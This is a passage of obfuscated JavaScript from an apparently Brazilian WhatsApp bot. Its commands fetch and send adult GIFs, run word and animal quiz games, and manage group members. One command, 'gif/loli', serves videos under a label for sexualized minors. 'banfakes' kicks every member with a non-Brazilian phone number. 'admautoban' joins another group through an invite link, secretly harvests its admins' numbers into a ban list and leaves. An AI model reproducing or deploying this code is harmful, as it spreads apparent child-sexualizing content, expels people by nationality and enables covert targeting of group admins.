            case "gif/ahegao":
              if (!_0x2f3424) {
                return _0x50740b("𝐒𝐎𝐌𝐄𝐍𝐓𝐄 𝐂𝐎𝐌 𝐎 𝐌𝐎𝐃𝐎+18 𝐀𝐓𝐈𝐕𝐎");
              }
              try {
                numbr = Math.floor(Math.random() * 26) + 1;
                _0x926ec9 = await getBuffer("https://raw.githubusercontent.com/Salientekill/Conteudos/main/nsfw/gif/ahegao/%20" + numbr + ".gif");
                ran = getRandom(".gif");
                rano = getRandom(".mp4");
                fs.writeFileSync(ran, _0x926ec9);
                exec("ffmpeg -i " + ran + " -movflags faststart -pix_fmt yuv420p -vf \"scale=trunc(iw/2)*2:trunc(ih/2)*2\" " + rano, async _0x43e558 => {
                  gif = fs.readFileSync(rano);
                  _0x36d5cf = await upload(gif);
                  console.log(_0x36d5cf);
                  const _0x30bc3d = {
                    url: _0x36d5cf
                  };
                  const _0x21d01e = {
                    video: _0x30bc3d,
                    gifPlayback: true,
                    caption: "🔥Aqui Está Seu Gif🔥"
                  };
                  const _0x21af8a = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x21d01e, _0x21af8a);
                  setTimeout(async function () {
                    fs.unlinkSync(ran);
                    fs.unlinkSync(rano);
                  }, 3000);
                });
              } catch (_0x57d324) {
                console.log("Error :", color(_0x57d324, "red"));
                _0x50740b(" *ERROR* ");
              }
              break;
            case "gif/loli":
              if (!_0x2f3424) {
                return _0x50740b("𝐒𝐎𝐌𝐄𝐍𝐓𝐄 𝐂𝐎𝐌 𝐎 𝐌𝐎𝐃𝐎+18 𝐀𝐓𝐈𝐕𝐎");
              }
              blaLN = ["https://telegra.ph/file/4237a0ae4841f541ed0b9.mp4", "https://telegra.ph/file/685bcc7a0119219ff77dd.mp4", "https://telegra.ph/file/d80e76e1094238197a325.mp4", "https://telegra.ph/file/8cdd8365a64fd0ce71cb9.mp4", "https://telegra.ph/file/6d691bc30972a5ea22e4a.mp4", "https://telegra.ph/file/92f36dc62bb08aca9d4e4.mp4", "https://telegra.ph/file/1ebd59dd985cf6d1e9b6b.mp4", "https://telegra.ph/file/8a0d9ea01b41d206a59ee.mp4", "https://telegra.ph/file/2e838d5a07019e7ae6fe1.mp4", "https://telegra.ph/file/6499abb6bcea141142aa2.mp4", "https://telegra.ph/file/711cfb21edc6f5e5bf257.mp4", "https://telegra.ph/file/620e9b759f3dd82b3bc3b.mp4", "https://telegra.ph/file/d752be9b700fdfc21e4f6.mp4", "https://telegra.ph/file/abe29d4c8e02e3078031e.mp4", "https://telegra.ph/file/7d93c4440c3f9538bc51c.mp4", "https://telegra.ph/file/ce6c71a90265fa398cf9f.mp4", "https://telegra.ph/file/05f6d21e39fccf5516047.mp4", "https://telegra.ph/file/39c6aa2401215b075a472.mp4", "https://telegra.ph/file/d9a1e4bdec09dd035163d.mp4", "https://telegra.ph/file/531c8a0bc8dfb92060ede.mp4", "https://telegra.ph/file/6545f018a9da70d3b79a4.mp4", "https://telegra.ph/file/e3bc16f5003e1a65f0dd0.mp4", "https://telegra.ph/file/39af98ee28c45305119fc.mp4"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              const _0x213f3f = {
                url: blarnd
              };
              const _0x3dd0cb = {
                video: _0x213f3f,
                gifPlayback: true,
                caption: "🔥Aqui Está Seu Gif🔥"
              };
              const _0x36db25 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x3dd0cb, _0x36db25);
              break;
            case "gif/ass":
              if (!_0x2f3424) {
                return _0x50740b("𝐒𝐎𝐌𝐄𝐍𝐓𝐄 𝐂𝐎𝐌 𝐎 𝐌𝐎𝐃𝐎+18 𝐀𝐓𝐈𝐕𝐎");
              }
              try {
                numbr = Math.floor(Math.random() * 22) + 1;
                _0x926ec9 = await getBuffer("https://raw.githubusercontent.com/Salientekill/Conteudos/main/nsfw/gif/ass/%20" + numbr + ".gif");
                ran = getRandom(".gif");
                rano = getRandom(".mp4");
                fs.writeFileSync(ran, _0x926ec9);
                exec("ffmpeg -i " + ran + " -movflags faststart -pix_fmt yuv420p -vf \"scale=trunc(iw/2)*2:trunc(ih/2)*2\" " + rano, async _0x5de438 => {
                  gif = fs.readFileSync(rano);
                  _0x36d5cf = await upload(gif);
                  console.log(_0x36d5cf);
                  const _0x3e5d69 = {
                    url: _0x36d5cf
                  };
                  const _0x31c475 = {
                    video: _0x3e5d69,
                    gifPlayback: true,
                    caption: "🔥Aqui Está Seu Gif🔥"
                  };
                  const _0x9be73b = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x31c475, _0x9be73b);
                  setTimeout(async function () {
                    fs.unlinkSync(ran);
                    fs.unlinkSync(rano);
                  }, 3000);
                });
              } catch (_0x53238) {
                console.log("Error :", color(_0x53238, "red"));
                _0x50740b(" *ERROR* ");
              }
              break;
            case "gif/blowjob":
              if (!_0x2f3424) {
                return _0x50740b("𝐒𝐎𝐌𝐄𝐍𝐓𝐄 𝐂𝐎𝐌 𝐎 𝐌𝐎𝐃𝐎+18 𝐀𝐓𝐈𝐕𝐎");
              }
              try {
                numbr = Math.floor(Math.random() * 22) + 1;
                _0x926ec9 = await getBuffer("https://raw.githubusercontent.com/Salientekill/Conteudos/main/nsfw/gif/blowjob/%20" + numbr + ".gif");
                ran = getRandom(".gif");
                rano = getRandom(".mp4");
                fs.writeFileSync(ran, _0x926ec9);
                exec("ffmpeg -i " + ran + " -movflags faststart -pix_fmt yuv420p -vf \"scale=trunc(iw/2)*2:trunc(ih/2)*2\" " + rano, async _0x375a8e => {
                  gif = fs.readFileSync(rano);
                  _0x36d5cf = await upload(gif);
                  console.log(_0x36d5cf);
                  const _0x256f03 = {
                    url: _0x36d5cf
                  };
                  const _0x49611d = {
                    video: _0x256f03,
                    gifPlayback: true,
                    caption: "🔥Aqui Está Seu Gif🔥"
                  };
                  const _0xcbb9e2 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x49611d, _0xcbb9e2);
                  setTimeout(async function () {
                    fs.unlinkSync(ran);
                    fs.unlinkSync(rano);
                  }, 3000);
                });
              } catch (_0x1bb77e) {
                console.log("Error :", color(_0x1bb77e, "red"));
                _0x50740b(" *ERROR* ");
              }
              break;
            case "gif/bdsm":
              if (!_0x2f3424) {
                return _0x50740b("𝐒𝐎𝐌𝐄𝐍𝐓𝐄 𝐂𝐎𝐌 𝐎 𝐌𝐎𝐃𝐎+18 𝐀𝐓𝐈𝐕𝐎");
              }
              try {
                numbr = Math.floor(Math.random() * 22) + 1;
                _0x926ec9 = await getBuffer("https://raw.githubusercontent.com/Salientekill/Conteudos/main/nsfw/gif/bsdm/%20" + numbr + ".gif");
                ran = getRandom(".gif");
                rano = getRandom(".mp4");
                fs.writeFileSync(ran, _0x926ec9);
                exec("ffmpeg -i " + ran + " -movflags faststart -pix_fmt yuv420p -vf \"scale=trunc(iw/2)*2:trunc(ih/2)*2\" " + rano, async _0x1c126b => {
                  gif = fs.readFileSync(rano);
                  _0x36d5cf = await upload(gif);
                  console.log(_0x36d5cf);
                  const _0x218d4c = {
                    url: _0x36d5cf
                  };
                  const _0x35d85a = {
                    video: _0x218d4c,
                    gifPlayback: true,
                    caption: "🔥Aqui Está Seu Gif🔥"
                  };
                  const _0x6ad68d = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x35d85a, _0x6ad68d);
                  setTimeout(async function () {
                    fs.unlinkSync(ran);
                    fs.unlinkSync(rano);
                  }, 3000);
                });
              } catch (_0x418f58) {
                console.log("Error :", color(_0x418f58, "red"));
                _0x50740b(" *ERROR* ");
              }
              break;
            case "gif/ero":
              if (!_0x2f3424) {
                return _0x50740b("𝐒𝐎𝐌𝐄𝐍𝐓𝐄 𝐂𝐎𝐌 𝐎 𝐌𝐎𝐃𝐎+18 𝐀𝐓𝐈𝐕𝐎");
              }
              try {
                numbr = Math.floor(Math.random() * 20) + 1;
                _0x926ec9 = await getBuffer("https://raw.githubusercontent.com/Salientekill/Conteudos/main/nsfw/gif/ero/%20" + numbr + ".gif");
                ran = getRandom(".gif");
                rano = getRandom(".mp4");
                fs.writeFileSync(ran, _0x926ec9);
                exec("ffmpeg -i " + ran + " -movflags faststart -pix_fmt yuv420p -vf \"scale=trunc(iw/2)*2:trunc(ih/2)*2\" " + rano, async _0x84370b => {
                  gif = fs.readFileSync(rano);
                  _0x36d5cf = await upload(gif);
                  console.log(_0x36d5cf);
                  const _0xe6334e = {
                    url: _0x36d5cf
                  };
                  const _0x3d307a = {
                    video: _0xe6334e,
                    gifPlayback: true,
                    caption: "🔥Aqui Está Seu Gif🔥"
                  };
                  const _0x59f3b1 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x3d307a, _0x59f3b1);
                  setTimeout(async function () {
                    fs.unlinkSync(ran);
                    fs.unlinkSync(rano);
                  }, 3000);
                });
              } catch (_0x1e3897) {
                console.log("Error :", color(_0x1e3897, "red"));
                _0x50740b(" *ERROR* ");
              }
              break;
            case "gif/femdom":
              if (!_0x2f3424) {
                return _0x50740b("𝐒𝐎𝐌𝐄𝐍𝐓𝐄 𝐂𝐎𝐌 𝐎 𝐌𝐎𝐃𝐎+18 𝐀𝐓𝐈𝐕𝐎");
              }
              try {
                numbr = Math.floor(Math.random() * 22) + 1;
                _0x926ec9 = await getBuffer("https://raw.githubusercontent.com/Salientekill/Conteudos/main/nsfw/gif/femdom/%20" + numbr + ".gif");
                ran = getRandom(".gif");
                rano = getRandom(".mp4");
                fs.writeFileSync(ran, _0x926ec9);
                exec("ffmpeg -i " + ran + " -movflags faststart -pix_fmt yuv420p -vf \"scale=trunc(iw/2)*2:trunc(ih/2)*2\" " + rano, async _0x406cda => {
                  gif = fs.readFileSync(rano);
                  _0x36d5cf = await upload(gif);
                  console.log(_0x36d5cf);
                  const _0x42ff24 = {
                    url: _0x36d5cf
                  };
                  const _0x1b8c94 = {
                    video: _0x42ff24,
                    gifPlayback: true,
                    caption: "🔥Aqui Está Seu Gif🔥"
                  };
                  const _0x5e6bf2 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x1b8c94, _0x5e6bf2);
                  setTimeout(async function () {
                    fs.unlinkSync(ran);
                    fs.unlinkSync(rano);
                  }, 3000);
                });
              } catch (_0x420481) {
                console.log("Error :", color(_0x420481, "red"));
                _0x50740b(" *ERROR* ");
              }
              break;
            case "gif/foot":
              if (!_0x2f3424) {
                return _0x50740b("𝐒𝐎𝐌𝐄𝐍𝐓𝐄 𝐂𝐎𝐌 𝐎 𝐌𝐎𝐃𝐎+18 𝐀𝐓𝐈𝐕𝐎");
              }
              try {
                numbr = Math.floor(Math.random() * 17) + 1;
                _0x926ec9 = await getBuffer("https://github.com/Salientekill/Conteudos/raw/main/nsfw/gif/foot/%20" + numbr + ".gif");
                ran = getRandom(".gif");
                rano = getRandom(".mp4");
                fs.writeFileSync(ran, _0x926ec9);
                exec("ffmpeg -i " + ran + " -movflags faststart -pix_fmt yuv420p -vf \"scale=trunc(iw/2)*2:trunc(ih/2)*2\" " + rano, async _0x2c12e1 => {
                  gif = fs.readFileSync(rano);
                  _0x36d5cf = await upload(gif);
                  console.log(_0x36d5cf);
                  const _0x561e69 = {
                    url: _0x36d5cf
                  };
                  const _0x3361ff = {
                    video: _0x561e69,
                    gifPlayback: true,
                    caption: "🔥Aqui Está Seu Gif🔥"
                  };
                  const _0x1efd29 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x3361ff, _0x1efd29);
                  setTimeout(async function () {
                    fs.unlinkSync(ran);
                    fs.unlinkSync(rano);
                  }, 3000);
                });
              } catch (_0x47921a) {
                console.log("Error :", color(_0x47921a, "red"));
                _0x50740b(" *ERROR* ");
              }
              break;
            case "gif/gangbang":
              if (!_0x2f3424) {
                return _0x50740b("𝐒𝐎𝐌𝐄𝐍𝐓𝐄 𝐂𝐎𝐌 𝐎 𝐌𝐎𝐃𝐎+18 𝐀𝐓𝐈𝐕𝐎");
              }
              try {
                numbr = Math.floor(Math.random() * 20) + 1;
                _0x926ec9 = await getBuffer("https://github.com/Salientekill/Conteudos/raw/main/nsfw/gif/gangbang/%20" + numbr + ".gif");
                ran = getRandom(".gif");
                rano = getRandom(".mp4");
                fs.writeFileSync(ran, _0x926ec9);
                exec("ffmpeg -i " + ran + " -movflags faststart -pix_fmt yuv420p -vf \"scale=trunc(iw/2)*2:trunc(ih/2)*2\" " + rano, async _0xe00a95 => {
                  gif = fs.readFileSync(rano);
                  _0x36d5cf = await upload(gif);
                  console.log(_0x36d5cf);
                  const _0x3173ef = {
                    url: _0x36d5cf
                  };
                  const _0x281602 = {
                    video: _0x3173ef,
                    gifPlayback: true,
                    caption: "🔥Aqui Está Seu Gif🔥"
                  };
                  const _0xea264f = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x281602, _0xea264f);
                  setTimeout(async function () {
                    fs.unlinkSync(ran);
                    fs.unlinkSync(rano);
                  }, 3000);
                });
              } catch (_0x182cdc) {
                console.log("Error :", color(_0x182cdc, "red"));
                _0x50740b(" *ERROR* ");
              }
              break;
            case "gif/glasses":
              if (!_0x2f3424) {
                return _0x50740b("𝐒𝐎𝐌𝐄𝐍𝐓𝐄 𝐂𝐎𝐌 𝐎 𝐌𝐎𝐃𝐎+18 𝐀𝐓𝐈𝐕𝐎");
              }
              try {
                numbr = Math.floor(Math.random() * 20) + 1;
                _0x926ec9 = await getBuffer("https://github.com/Salientekill/Conteudos/raw/main/nsfw/gif/glasses/%20" + numbr + ".gif");
                ran = getRandom(".gif");
                rano = getRandom(".mp4");
                fs.writeFileSync(ran, _0x926ec9);
                exec("ffmpeg -i " + ran + " -movflags faststart -pix_fmt yuv420p -vf \"scale=trunc(iw/2)*2:trunc(ih/2)*2\" " + rano, async _0x18d074 => {
                  gif = fs.readFileSync(rano);
                  _0x36d5cf = await upload(gif);
                  console.log(_0x36d5cf);
                  const _0x40ba2f = {
                    url: _0x36d5cf
                  };
                  const _0x5d33dd = {
                    video: _0x40ba2f,
                    gifPlayback: true,
                    caption: "🔥Aqui Está Seu Gif🔥"
                  };
                  const _0x46fa21 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x5d33dd, _0x46fa21);
                  setTimeout(async function () {
                    fs.unlinkSync(ran);
                    fs.unlinkSync(rano);
                  }, 3000);
                });
              } catch (_0x56a4bd) {
                console.log("Error :", color(_0x56a4bd, "red"));
                _0x50740b(" *ERROR* ");
              }
              break;
            case "gif/masturbation":
              if (!_0x2f3424) {
                return _0x50740b("𝐒𝐎𝐌𝐄𝐍𝐓𝐄 𝐂𝐎𝐌 𝐎 𝐌𝐎𝐃𝐎+18 𝐀𝐓𝐈𝐕𝐎");
              }
              try {
                numbr = Math.floor(Math.random() * 20) + 1;
                _0x926ec9 = await getBuffer("https://github.com/Salientekill/Conteudos/raw/main/nsfw/gif/masturbation/%20" + numbr + ".gif");
                ran = getRandom(".gif");
                rano = getRandom(".mp4");
                fs.writeFileSync(ran, _0x926ec9);
                exec("ffmpeg -i " + ran + " -movflags faststart -pix_fmt yuv420p -vf \"scale=trunc(iw/2)*2:trunc(ih/2)*2\" " + rano, async _0x210ee0 => {
                  gif = fs.readFileSync(rano);
                  _0x36d5cf = await upload(gif);
                  console.log(_0x36d5cf);
                  const _0x7d03cc = {
                    url: _0x36d5cf
                  };
                  const _0x41aa46 = {
                    video: _0x7d03cc,
                    gifPlayback: true,
                    caption: "🔥Aqui Está Seu Gif🔥"
                  };
                  const _0x3512cf = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x41aa46, _0x3512cf);
                  setTimeout(async function () {
                    fs.unlinkSync(ran);
                    fs.unlinkSync(rano);
                  }, 3000);
                });
              } catch (_0x27d8d0) {
                console.log("Error :", color(_0x27d8d0, "red"));
                _0x50740b(" *ERROR* ");
              }
              break;
            case "gif/neko":
              if (!_0x2f3424) {
                return _0x50740b("𝐒𝐎𝐌𝐄𝐍𝐓𝐄 𝐂𝐎𝐌 𝐎 𝐌𝐎𝐃𝐎+18 𝐀𝐓𝐈𝐕𝐎");
              }
              try {
                numbr = Math.floor(Math.random() * 20) + 1;
                _0x926ec9 = await getBuffer("https://github.com/Salientekill/Conteudos/raw/main/nsfw/gif/neko/%20" + numbr + ".gif");
                ran = getRandom(".gif");
                rano = getRandom(".mp4");
                fs.writeFileSync(ran, _0x926ec9);
                exec("ffmpeg -i " + ran + " -movflags faststart -pix_fmt yuv420p -vf \"scale=trunc(iw/2)*2:trunc(ih/2)*2\" " + rano, async _0x5294b1 => {
                  gif = fs.readFileSync(rano);
                  _0x36d5cf = await upload(gif);
                  console.log(_0x36d5cf);
                  const _0x33e3a5 = {
                    url: _0x36d5cf
                  };
                  const _0x4eef8a = {
                    video: _0x33e3a5,
                    gifPlayback: true,
                    caption: "🔥Aqui Está Seu Gif🔥"
                  };
                  const _0x4266a6 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x4eef8a, _0x4266a6);
                  setTimeout(async function () {
                    fs.unlinkSync(ran);
                    fs.unlinkSync(rano);
                  }, 3000);
                });
              } catch (_0x390d1f) {
                console.log("Error :", color(_0x390d1f, "red"));
                _0x50740b(" *ERROR* ");
              }
              break;
            case "gif/orgy":
              if (!_0x2f3424) {
                return _0x50740b("𝐒𝐎𝐌𝐄𝐍𝐓𝐄 𝐂𝐎𝐌 𝐎 𝐌𝐎𝐃𝐎+18 𝐀𝐓𝐈𝐕𝐎");
              }
              try {
                numbr = Math.floor(Math.random() * 19) + 1;
                _0x926ec9 = await getBuffer("https://github.com/Salientekill/Conteudos/raw/main/nsfw/gif/orgy/%20" + numbr + ".gif");
                ran = getRandom(".gif");
                rano = getRandom(".mp4");
                fs.writeFileSync(ran, _0x926ec9);
                exec("ffmpeg -i " + ran + " -movflags faststart -pix_fmt yuv420p -vf \"scale=trunc(iw/2)*2:trunc(ih/2)*2\" " + rano, async _0x41ee02 => {
                  gif = fs.readFileSync(rano);
                  _0x36d5cf = await upload(gif);
                  console.log(_0x36d5cf);
                  const _0x1dbcc8 = {
                    url: _0x36d5cf
                  };
                  const _0x290c38 = {
                    video: _0x1dbcc8,
                    gifPlayback: true,
                    caption: "🔥Aqui Está Seu Gif🔥"
                  };
                  const _0xe07fe = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x290c38, _0xe07fe);
                  setTimeout(async function () {
                    fs.unlinkSync(ran);
                    fs.unlinkSync(rano);
                  }, 3000);
                });
              } catch (_0xbfc6be) {
                console.log("Error :", color(_0xbfc6be, "red"));
                _0x50740b(" *ERROR* ");
              }
              break;
            case "gif/panties":
              if (!_0x2f3424) {
                return _0x50740b("𝐒𝐎𝐌𝐄𝐍𝐓𝐄 𝐂𝐎𝐌 𝐎 𝐌𝐎𝐃𝐎+18 𝐀𝐓𝐈𝐕𝐎");
              }
              try {
                numbr = Math.floor(Math.random() * 20) + 1;
                _0x926ec9 = await getBuffer("https://github.com/Salientekill/Conteudos/raw/main/nsfw/gif/panties/%20" + numbr + ".gif");
                ran = getRandom(".gif");
                rano = getRandom(".mp4");
                fs.writeFileSync(ran, _0x926ec9);
                exec("ffmpeg -i " + ran + " -movflags faststart -pix_fmt yuv420p -vf \"scale=trunc(iw/2)*2:trunc(ih/2)*2\" " + rano, async _0x5eebc5 => {
                  gif = fs.readFileSync(rano);
                  _0x36d5cf = await upload(gif);
                  console.log(_0x36d5cf);
                  const _0xc1b6e4 = {
                    url: _0x36d5cf
                  };
                  const _0x580ac3 = {
                    video: _0xc1b6e4,
                    gifPlayback: true,
                    caption: "🔥Aqui Está Seu Gif🔥"
                  };
                  const _0x394d31 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x580ac3, _0x394d31);
                  setTimeout(async function () {
                    fs.unlinkSync(ran);
                    fs.unlinkSync(rano);
                  }, 3000);
                });
              } catch (_0x395310) {
                console.log("Error :", color(_0x395310, "red"));
                _0x50740b(" *ERROR* ");
              }
              break;
            case "gif/tentacles":
              if (!_0x2f3424) {
                return _0x50740b("𝐒𝐎𝐌𝐄𝐍𝐓𝐄 𝐂𝐎𝐌 𝐎 𝐌𝐎𝐃𝐎+18 𝐀𝐓𝐈𝐕𝐎");
              }
              try {
                numbr = Math.floor(Math.random() * 20) + 1;
                _0x926ec9 = await getBuffer("https://github.com/Salientekill/Conteudos/raw/main/nsfw/gif/tentacles/%20" + numbr + ".gif");
                ran = getRandom(".gif");
                rano = getRandom(".mp4");
                fs.writeFileSync(ran, _0x926ec9);
                exec("ffmpeg -i " + ran + " -movflags faststart -pix_fmt yuv420p -vf \"scale=trunc(iw/2)*2:trunc(ih/2)*2\" " + rano, async _0x39ccce => {
                  gif = fs.readFileSync(rano);
                  _0x36d5cf = await upload(gif);
                  console.log(_0x36d5cf);
                  const _0x11ffb1 = {
                    url: _0x36d5cf
                  };
                  const _0x487426 = {
                    video: _0x11ffb1,
                    gifPlayback: true,
                    caption: "🔥Aqui Está Seu Gif🔥"
                  };
                  const _0x5287a6 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x487426, _0x5287a6);
                  setTimeout(async function () {
                    fs.unlinkSync(ran);
                    fs.unlinkSync(rano);
                  }, 3000);
                });
              } catch (_0x1f3552) {
                console.log("Error :", color(_0x1f3552, "red"));
                _0x50740b(" *ERROR* ");
              }
              break;
            case "gif/yuri":
              if (!_0x2f3424) {
                return _0x50740b("𝐒𝐎𝐌𝐄𝐍𝐓𝐄 𝐂𝐎𝐌 𝐎 𝐌𝐎𝐃𝐎+18 𝐀𝐓𝐈𝐕𝐎");
              }
              try {
                numbr = Math.floor(Math.random() * 18) + 1;
                _0x926ec9 = await getBuffer("https://github.com/Salientekill/Conteudos/raw/main/nsfw/gif/yuri/%20" + numbr + ".gif");
                ran = getRandom(".gif");
                rano = getRandom(".mp4");
                fs.writeFileSync(ran, _0x926ec9);
                exec("ffmpeg -i " + ran + " -movflags faststart -pix_fmt yuv420p -vf \"scale=trunc(iw/2)*2:trunc(ih/2)*2\" " + rano, async _0x34f187 => {
                  gif = fs.readFileSync(rano);
                  _0x36d5cf = await upload(gif);
                  console.log(_0x36d5cf);
                  const _0x43da70 = {
                    url: _0x36d5cf
                  };
                  const _0x5b6b1c = {
                    video: _0x43da70,
                    gifPlayback: true,
                    caption: "🔥Aqui Está Seu Gif🔥"
                  };
                  const _0x46420c = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x5b6b1c, _0x46420c);
                  setTimeout(async function () {
                    fs.unlinkSync(ran);
                    fs.unlinkSync(rano);
                  }, 3000);
                });
              } catch (_0x448866) {
                console.log("Error :", color(_0x448866, "red"));
                _0x50740b(" *ERROR* ");
              }
              break;
            case "hentai":
              {
                if (!_0x2f3424) {
                  return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
                }
                _0x50740b(enviar.espere);
                anu = await hentai();
                resultable = anu[Math.floor(Math.random() * anu.length)];
                const _0x5a6ac2 = {
                  url: resultable.video_1
                };
                const _0x4add75 = {
                  video: _0x5a6ac2,
                  caption: "⭔ Título: " + resultable.title + "\n⭔ Visualizações " + resultable.views_count + "\n⭔ compartilhamentos : " + resultable.share_count
                };
                const _0x5349f1 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x4add75, _0x5349f1);
              }
              break;
            case "attprandom":
              if (!_0x11e99e) {
                return _0x50740b("cade o texto");
              }
              attp(_0x11e99e).then(_0x2163be => {
                _0x125a55(_0x346d97, _0x2163be.url, _0xd2050d);
              });
              break;
            case "emojibot":
            case "setemoji":
              if (_0x11e99e.length > 2) {
                return _0x50740b("*Somente 1 Emoji*");
              }
              if (!_0x51f1a3(_0x11e99e)) {
                return _0x50740b("*Somente 1 Emoji*");
              }
              if (!_0xf59944 && !_0x3eefd0 && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              _0x50740b("O Emoji Do Bot Foi Alterado Com Sucesso Para: " + _0x11e99e + "\nReiniciando Aguarde");
              setting.EmojiBot = _0x11e99e;
              fs.writeFileSync("./DADOS/settings.json", JSON.stringify(setting, null, 2));
              setTimeout(() => {
                process.exit();
              }, 1000);
              break;
            case "banfakes":
            case "kickfakes":
              if (!_0xf59944 && !_0x3eefd0) {
                return _0x50740b("Só dono pode utilizar este comando...");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0xd2050d.key.fromMe) {
                return;
              }
              function _0x33358e(_0x23d9a6) {
                return _0x23d9a6.startsWith('55');
              }
              let _0x2e45f0 = groupMembers.filter(_0x1671dc => {
                return !_0x5bd5f4.includes(_0x1671dc.id) && !_0x1c25a7.includes(_0x1671dc.id) && !_0x1671dc.id.startsWith('55');
              });
              let _0x6a2222 = _0x2e45f0.map(_0x4a02ee => _0x4a02ee.id);
              if (_0x6a2222.length > 0) {
                for (const _0x3e1877 of _0x6a2222) {
                  await sleep(500);
                  _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x3e1877], "remove");
                }
              } else {
                _0x50740b("Não Foram Encontrado Nenhum Membro Estrangeiro.");
              }
              break;
            case "admautoban":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63 && !_0xf59944) {
                return _0x50740b("Precisa ser Dono ou Adm");
              }
              _0x50740b("espere um momento");
              var _0x3c61a2 = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i;
              var [_0x961dae, _0x5a2855] = _0x11e99e.match(_0x3c61a2) || [];
              if (!_0x5a2855) {
                return _0x50740b("Link Invalido");
              }
              try {
                var _0x36d5cf = await _0x5196be.groupAcceptInvite(_0x5a2855);
              } catch {
                _0x50740b("ERRO, NÚMERO DO BOT JA FOI BANIDO OU ELE ESTA NO GRUPO DO LINK,");
              }
              resp = await _0x5196be.groupMetadata(_0x36d5cf);
              ggg = resp.participants.filter(_0x186169 => _0x186169.admin);
              nunber = '';
              for (number of ggg) {
                await delay(1000);
                _0x326cbd[0].listanegra.push(number.id);
                _0x137e44(_0x326cbd);
                nunber += "# " + number.id.match(/([0-9A-Za-z]{10,14})/i)[0] + "\n";
              }
              _0x50740b("*Números Adicionados A Lista De Autoban*\n*" + ggg.length + " Pessoas Adicionadas A Lista De Autoban*\n" + nunber);
              await delay(1000);
              _0x5196be.groupLeave(resp.id);
              break;
            case "quizanimais":
              if (_0x23d865.length < 1) {
                return _0x50740b("use 1 para ativar o jogo \npara desativar use quizanimais 0");
              }
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              const _0x530bb0 = Math.floor(Math.random() * quizanimais.length);
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x23d865.join(" ") === '1') {
                if (fs.existsSync("./DADOS/json/quizanim-" + _0x346d97 + ".json")) {
                  let _0xee8de2 = JSON.parse(fs.readFileSync("./DADOS/json/quizanim-" + _0x346d97 + ".json"));
                  imagemtexto = "                             「❓Quiz❓」";
                  const _0x5c88a0 = {
                    url: _0xee8de2.foto
                  };
                  const _0x2660d5 = {
                    image: _0x5c88a0,
                    caption: imagemtexto,
                    thumbnail: blalogoofc
                  };
                  const _0x351269 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x2660d5, _0x351269);
                } else {
                  fs.writeFileSync("./DADOS/json/quizanim-" + _0x346d97 + ".json", '' + JSON.stringify(quizanimais[_0x530bb0]));
                  imagemtexto = "                             「❓Quiz❓」";
                  let _0x12e762 = JSON.parse(fs.readFileSync("./DADOS/json/quizanim-" + _0x346d97 + ".json"));
                  const _0x22d3d5 = {
                    url: _0x12e762.foto
                  };
                  const _0x163dbb = {
                    image: _0x22d3d5,
                    caption: imagemtexto,
                    thumbnail: blalogoofc
                  };
                  const _0x53ad89 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x163dbb, _0x53ad89);
                }
              } else {
                if (_0x23d865.join(" ") === '0') {
                  if (!fs.existsSync("./DADOS/json/quizanim-" + _0x346d97 + ".json")) {
                    return _0x50740b("Não tem como desativar o jogo pôs ele não foi ativado");
                  }
                  fs.unlinkSync("./DADOS/json/quizanim-" + _0x346d97 + ".json");
                  _0x50740b("Desativado com sucesso");
                }
              }
              break;
            case "revelaranimal":
            case "revelaanimal":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              let _0x4eeb13 = JSON.parse(fs.readFileSync("./armor/quizanim-" + _0x346d97 + ".json"));
              _0x50740b('' + _0x4eeb13.original);
              break;
            case "anagrama":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              let _0x546709 = Math.floor(Math.random() * palavrasANA.length);
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x11e99e) {
                return _0x50740b("use 1 para ativar o jogo do anagrama\npara desativar use anagrama 0");
              }
              cujson = JSON.parse(fs.readFileSync("./DADOS/json/rankana.json"));
              cujson = {};
              fs.writeFileSync("./DADOS/json/rankana.json", JSON.stringify(cujson, 1));
              if (_0x23d865.join(" ") === '1') {
                if (fs.existsSync("./DADOS/json/anagrama-" + _0x346d97 + ".json")) {
